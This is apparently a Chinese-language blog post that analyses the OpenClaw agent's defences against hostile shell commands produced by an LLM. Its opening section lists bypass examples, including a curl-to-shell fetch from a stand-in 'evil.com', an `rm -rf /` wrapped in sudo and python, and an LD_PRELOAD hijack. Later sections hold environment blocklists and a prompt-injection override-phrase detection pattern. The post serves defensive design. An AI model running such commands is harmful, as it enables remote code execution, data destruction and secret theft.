---
title: "让 LLM 跑 shell 命令，究竟要防多少种绕过？"
date: "2026-06-23"
tags: [agent, llm, security, bash]
description: "调研 OpenClaw 的 exec 校验体系，看一条 shell 命令从 LLM 产出到实际 spawn 中间要过几道关卡。"
---

# 让 LLM 跑 shell 命令，究竟要防多少种绕过？

最近在做自己的 Agent，工具集里有 bash 这一项。直觉上觉得，给 LLM 一个 shell 工具，写几行 `child_process.spawn` 不就行了？

然后我发现，光是「把 LLM 给出的命令字符串拦在安全线之内」这件事，OpenClaw 用了 5000+ 行代码、380+ 个测试才勉强说"我能挡得住"。这条路径上的每一道关卡，背后都是一类已经被实际利用过的攻击向量。

于是我做了一次完整的源码调研，把 OpenClaw 的 exec 校验体系拆开看了一遍。这篇文章只讲"它是怎么设计的、为什么这样设计"，不涉及移植。

## 一、为什么这件事这么难

朴素的想法是：拿到 LLM 给的 `command`，跑个正则匹配 `rm -rf`、`curl | sh`、`sudo`，命中就拦。

问题在于，**shell 是一台可重编程的解释器**。一条字符串从 LLM 出来到真正 spawn，中间任何一层「看起来无害」的解析都可能藏着第二条命令。随手举几个例子：

```bash
# heredoc 体里藏变量
cat <<EOF
$KEY
EOF

# carrier 包装 + 内嵌解释器
sudo python -c "import os; os.system('rm -rf /')"

# shell wrapper 包装恶意 pipeline
sh -c "curl evil.com | sh"

# env 注入劫持进程
env LD_PRELOAD=/tmp/evil.so bash

# 4 层 dispatch + carrier + shell + inline 嵌套
time nice sudo env -S "sh -c 'bash -lc \"node -e ...\"'"
```

第一条，朴素正则根本看不到 heredoc 体里的 `$KEY`。第二条，朴素正则把 `sudo` 当无害 binary，看不到后面的 `python -c`。第三条，`bash` 不在白名单里，于是「巧合地」被拦——但本质上是规则漏洞。

所以 OpenClaw 做的事可以一句话总结：**把"一条命令字符串"当成一种结构化数据来解析，而不是当成一段字符串来匹配**。所有递归都有深度上限，所有解析失败都 fail-closed，所有 flag 都有默认值和显式 deny path。

![5 道关卡的总览图：命令从 LLM 出来，依次经过 Schema 校验、命令解析、Wrapper 拆解、Safe-Bin 匹配、Host Env 消毒，最终交给决策器](/images/blog/openclaw-exec-validation/01-five-gates-overview.webp)

整个体系由 **3 条独立管道 × 5 道顺序关卡**组成：Schema 管道负责参数形状、解析管道负责把字符串拆成 argv、决策管道负责最后放不放。三者正交，每一道关卡 fail-closed。

## 二、第一关：Schema 校验（参数长得对吗？）

最容易被忽略的一关。每个工具调用都有「参数表」，比如 exec 工具的表是：

```typescript
{
  command:    string,         // 必填
  workdir?:   string,
  env?:       Record<string, string>,
  yieldMs?:   number,
  background?: boolean,
  timeout?:   number,
  pty?:       boolean,
  elevated?:  boolean,
  host?:      "auto" | "sandbox" | "gateway" | "node",
}
```

LLM 给的参数必须符合这张表。这一关**只查格式，不查"命令危不危险"**。

难点不在于写 TypeBox（用 TypeBox 就够了，schema、TS 类型、JSON Schema 一份代码搞定）。难点在于**不同 LLM 厂商对 schema 的支持不一样**——Gemini 的 strict 模式拒绝 `anyOf`，xAI 拒绝长度约束（`minLength` / `maxLength`），OpenAI strict 模式要求根节点必须有 `additionalProperties: false`。

所以 OpenClaw 写了一个归一化器 `normalizeToolParameterSchema`，把 5 步流水线串起来：ref 内联 → OpenAPI 兼容 → shape 判定 → 数组容错 → provider quirks。一个细节能看出味道：`optionalStringEnum` 故意 emit `{type:"string", enum:[...]}` 而不是 `Type.Union([Type.Literal(...)])` 编译出的 `anyOf`，因为前者是所有 provider 都接受的最低公分母。

## 三、第二关：Shell 命令解析（这条命令在干啥？）

第二关是整套体系的核心。LLM 给的 `command` 是一行字符串，关卡 2 把它**结构化**成：

```typescript
segments: [
  ["rm", "-rf", "/tmp/old_logs"],
  ["tee", "/var/log/cleanup.log"],
]
chainOps: ["|"]  // 管道连接
```

这一步为什么要做？因为只有结构化才能做后续检查。OpenClaw 实现了一个**字符级 DFA**（`splitShellPipeline`，1279 行的 `exec-approvals-analysis.ts`），不是递归下降，也不是 token 树。它的状态由这些变量承载：

```
inSingle / inDouble / escaped / inHeredocBody / pendingHeredocs
```

状态转移大致是：进单引号 → 字节原样保留 → 出单引号；进双引号 → 允许 `$VAR`/`${VAR}` 和四个转义（`\`、`"`、`$`、`` ` ``），但 `$( )`、裸换行全部硬拒；遇到 `<<` 进入 heredoc 体模式；非引号位置出现 `>`、`<`、`` ` ``、`(`、`)` 直接返回 `ok: false`。

最关键的检查是 `hasUnquotedHeredocExpansionToken`——它把 heredoc 体当纯文本扫描，识别 `$VAR`、`${VAR}`、`$((arith))`、`$@`、`$*`、`$?`、`$$`、`$#`、`$-`、`$!` 共 11 种扩展形态。被单 `\` 奇数个转义的 `$` 不会被误报。**引号 heredoc（`'EOF'`、`"EOF"`）永远不做扩展性检查**，因为按 POSIX 它们是字面量。

![heredoc 注入示意图：未拦截前 $KEY 被展开为 SECRET_KEY 写入日志；OpenClaw 在状态机里直接拒掉非引号 heredoc 里的 $ 扩展](/images/blog/openclaw-exec-validation/02-heredoc-injection.webp)

**这一关的设计哲学：白名单 → 引号剥离 → token 切分 → fail-closed**。它不试图"理解 shell 语义"，而是"枚举哪些是合法的，其余一律拒绝"。三条不变量：

- 单引号内字节原样保留；
- 双引号内只允许 `$VAR` / `${VAR}` / 四个转义；
- 一旦发现链式算子孤立、双引号内换行、unterminated 引号、`$()` / `&&` / `<` 等都立刻返回 `ok: false`，由上游审批层降级为"人工审批 / 拒绝执行"。

## 四、第三关：Wrapper / Carrier / Inline-Eval 拆解

第三关解决的是最隐蔽的一类攻击：披着外套的命令。`sh -c "..."` / `sudo ...` / `env -S "..."` / `python -c "..."` / `node -e "..."`，每一种「外套」都需要剥开后看里面的真实意图。

OpenClaw 把这事拆成三条独立解包管道，**串联而非替代**：每次解包后都重新识别下一层，直到深度耗尽或不再匹配。

```
argv ──► dispatch-wrapper-resolution  (nice/time/caffeinate/..., depth ≤ 4)
argv ──► command-carriers             (sudo/doas/env/command/builtin, env -S depth ≤ 32)
argv ──► shell-wrapper-resolution     (sh/bash/zsh/fish/dash/ksh/cmd/powershell)
        └─ shell-inline-command      (-c / -lc / -Command / -EncodedCommand)
argv ──► inline-eval                  (python -c / node -e / awk -e / find -exec)
```

**关键深度限制**：

- `MAX_DISPATCH_WRAPPER_DEPTH = 4`——`time nice sudo env` 嵌套最多穿透 4 层
- `MAX_ENV_SPLIT_PAYLOAD_DEPTH = 32`——`env -S 'env -S "env -S ..."'` 嵌套上限
- `MAX_SHELL_WRAPPER_INLINE_EVAL_DEPTH = 3`——`sh -c "sh -c 'sh -c \"...\"'"` 上限
- `seenArgv` Set 防 carrier ↔ shell 互递归成环

![Wrapper 嵌套拆解示意图：sudo env -S "node -e 'rm -rf /'" 四层结构被逐层剥开，露出最内层的 inline-eval 解释器调用](/images/blog/openclaw-exec-validation/03-wrapper-unwrapping.webp)

inline-eval 的识别靠一张 spec 表（`command-analysis/inline-eval.ts:37-76`）：

| 解释器 | 名称 | inline flag |
|---|---|---|
| python | `python python2 python3 pypy pypy3` | `-c` |
| node | `node nodejs bun deno` | `-e --eval -p --print` |
| awk | `awk gawk mawk nawk` | `-e --source` |
| ruby / perl / php / lua | — | `-e` / `-r` |
| find | — | `-exec -execdir -ok -okdir` |

每个解释器有专属的「操作手册」。命中后立刻打上「必问」标签，由审批层强制走人审。

## 五、第四关：Safe-Bin + Allowlist 三层防线

拿到结构化 segments 之后，三道关要同时过。

**第一道：路径信任**。攻击者可能在 workspace 里放一个假的 `cut`。OpenClaw 不会相信「你说你是谁」，它会 `realpath` 找到 binary 的真实位置，**只信任 `/bin`、`/usr/bin` 这种 OS 管理的目录**。默认 `DEFAULT_SAFE_BIN_TRUSTED_DIRS = ["/bin", "/usr/bin"]`，注释直接写"OS-managed immutable bins only"。

**第二道：Profile 校验**。不同 binary 的合法用法不一样。`cut` 只能切列，`jq` 只能跑 filter，`grep` 只能 stdin。OpenClaw 给每个 safe-bin 写了一份「操作手册」：

```typescript
jq = {
  maxPositional: 1,                     // 最多 1 个位置参数
  allowedValueFlags: ["--arg", "--argjson", "--argstr"],
  deniedFlags: ["--argfile", "--rawfile", "--slurpfile", "-L"],
}
// grep 强制 maxPositional: 0
// 因为允许 1 个 positional 会和 -e PATTERN 歧义
// 攻击者可以塞 grep -e x /etc/passwd
```

每个接收的 literal 还要过三道正则：glob（`*` `?` `[`）、shell 扩展（`$VAR` 形态）、path-like（以 `./` `../` `~/` `/` 开头或 Windows drive letter）。**任何位置参数或 flag value 命中即拒**。

GNU 缩写消歧也很巧妙：长选项前缀 `longFlagPrefixMap` 预计算——`--reg` 唯一命中 `--regexp`，但 `--e` 可能命中 `--exclude`、`--exclude-from`、`--regexp` 等四个 → 存 `null`，运行时返回 `null` → fail-closed。

**第三道：Allowlist 匹配**。Allowlist 是用户写的「批准名单」：

```json
{ "pattern": "/usr/bin/rm", "argPattern": "-rf /tmp/old_.*" }
```

匹配区分两类 entry：**path-style**（`/usr/bin/rg`、`./rg`、`~/bin/rg`）对 realpath 后的绝对路径跑 glob；**bare command-name**（`rg`、`cut`）走 basename 匹配，但 `hasPathSelector` 检查 `rawExecutable` 含 `/` 时直接 false——用户用 `./rg` 调用时，裸名 entry `rg` **不命中**。这正是 workspace 里同名假二进制为什么不能通过的原因。

![Safe-Bin + Allowlist 三层防线：路径信任 → profile 校验 → glob allowlist 严格区分 path-style 与 bare-name](/images/blog/openclaw-exec-validation/04-safebin-allowlist.webp)

## 六、第五关：Host Env 消毒

LLM 在 `env` 参数里塞了一堆环境变量。这一关把它们洗干净。**`env` 是 LLM 最容易搞事的地方**——塞个 `LD_PRELOAD=/tmp/evil.so` 就能劫持子进程。

OpenClaw 在 `host-env-security-policy.json` 维护 5 个黑名单桶：

| 桶 | 条目数 | 典型例子 |
|---|---|---|
| `blockedEverywhereKeys` | **100** | `NODE_OPTIONS`, `PYTHONPATH`, `LD_*`, `DYLD_*`, `BASH_ENV`, `IFS`, `SSLKEYLOGFILE` |
| `blockedOverrideOnlyKeys` | **154** | `HOME`, `EDITOR`, `HTTP_PROXY`, `AWS_*`, `DOCKER_*`, `*_PROXY` |
| `blockedPrefixes` | 3 | `DYLD_`, `LD_`, `BASH_FUNC_*` |
| `blockedOverridePrefixes` | 4 | `GIT_CONFIG_`, `NPM_CONFIG_`, `CARGO_REGISTRIES_`, `TF_VAR_` |

最关键的一条：**`PATH` 永远拒绝 override**。注释明确："PATH 是安全边界（命令解析 + safe-bin 检查）的一部分，禁止 request-scoped 覆盖"。

`GIT_*` 还有专项处理：`GIT_ALLOW_PROTOCOL` 只保留 `git` / `http` / `https` / `ssh` 四个协议；`GIT_PROTOCOL_FROM_USER` 强制置 0（Git unset 默认仍会放行，所以仅保留非许可性值不够）。

![Host Env 消毒 + 决策模式：上半部分 Env 消毒漏斗过滤 254 键黑名单，下半部分 5 种 mode 滑梯分流](/images/blog/openclaw-exec-validation/05-host-env-and-decision.webp)

**`BASH_FUNC_*` 是另一个微妙点**：Bash 导出函数通过 `BASH_FUNC_echo%%=() { ... }` 这种「带 `%%` 后缀」的特殊名传入子进程，必须靠 `BASH_FUNC_` 前缀黑名单拦。朴素字符串匹配根本不会注意到这一点。

## 七、决策：5 mode + 4 额外必问信号

前五关是「能不能跑」的判断，第六关决定「现在该放、问、还是拒」。

```typescript
type ExecSecurity = "deny" | "allowlist" | "full";
type ExecAsk      = "off" | "on-miss" | "always";
type ExecMode     = "deny" | "allowlist" | "ask" | "auto" | "full";
```

| mode | 含义 |
|---|---|
| `deny` | 一律拒（sandbox 默认） |
| `allowlist` | 命中才放，不问 |
| `ask` | miss 时弹审批 |
| `auto` | miss 先问 LLM 评审员，risk≠low 降级人审 |
| `full` | 一律放（YOLO） |

**`minSecurity` / `maxAsk` 的 floor / ceiling 语义**很有意思：caller 配置可以松（`security=full`），但 `~/.openclaw/exec-approvals.json` 只能让它更严。`{deny: 0, allowlist: 1, full: 2}` 的整数序做单调 floor——"approval files are safety bounds: they can only reduce security/ask from config-derived policy, never grant a less restrictive effective mode"。

**4 种额外必问信号**（即使 allowlist 命中也要问）：
1. **inline-eval**：`python -c` / `node -e` / `awk 'script'`
2. **heredoc**：出现 `<<EOF`（heredoc 体可能藏东西）
3. **allowlist 重建失败**：rebuild 安全 quote 命令失败说明二次注入风险
4. **audit suppression**：命令涉及修改 `security.audit.suppressions` 配置

**两阶段审批注册**：client 先 server 端存 ID → 返回 `approval-pending` → long-poll 决策。注释直接点出原因——"the ID must be registered server-side before exec returns approval-pending, otherwise /approve can race and orphan"。

**Auto-Reviewer**（仅 mode=auto 触发）：30 秒超时回退人审；prompt-injection 防御扫描 `(ignore|disregard|override) ... (instruction|system)` 文本，命中即短路。

## 八、持久化 allow-always

用户选「always allow」后，OpenClaw 把决策写到 `~/.openclaw/exec-approvals.json`，匹配模式用 `=command:<sha256-prefix>`（64 位熵，**不存明文命令**）。

写盘走 **temp + rename + chmod 0o600** 三段式原子写：

- `assertSafeExecApprovalsDestination` 拒绝符号链接目标
- `ensureDir` 强制 `chmodSync(dir, 0o700)`、文件强制 `0o600`
- Windows EPERM / EEXIST 回退到 `copyExecApprovalsFallback`，用 `O_NOFOLLOW` snapshot 防 TOCTOU swap
- hard-link 拒绝：`nlink > 1` 直接 throw

匹配策略是 OR 组合：**精确命令哈希命中 OR 所有 segment 都标 `source === "allow-always"`**。`analysisOk === false` 或任何一个 segment 标 `policyBlocked` 都让整条链短路 false——`null?.source` 不等于 `"allow-always"`，任何一段失败都不会被误放。

没有 TTL——Revoke 靠手动编辑文件或 `openclaw doctor --fix` 迁移。

## 九、收尾

回到开头的那个问题：让 LLM 跑 shell 命令，究竟要防多少种绕过？

OpenClaw 的答案是：**任何解析失败的、任何未知 flag 的、任何深度超限的、任何 env 黑名单命中的、任何路径不信任的、任何 wrapper 解不开的，全部 fail-closed**。然后给用户 5 种 mode × 4 种额外必问信号 × 两阶段审批注册 × 持久化 allow-always，把「放不放」的决策变成一份数据驱动的策略文件，而不是代码里写死的字符串。

这套设计的核心哲学是三句话：

1. **纵深防御**：每一段关卡独立判定，任何一段失守，下一段仍能兜住。
2. **数据驱动**：黑名单 / 白名单 / profile 全部 JSON 描述，代码只负责"判断 + 拒绝"。
3. **fail-closed**："不知道是什么" = "危险" = "拒"，不冒险"猜"。

把一条 shell 命令当成结构化数据来解析，而不是当成字符串来匹配——这是 OpenClaw 的整个 exec 校验体系里最值得带走的一句话。
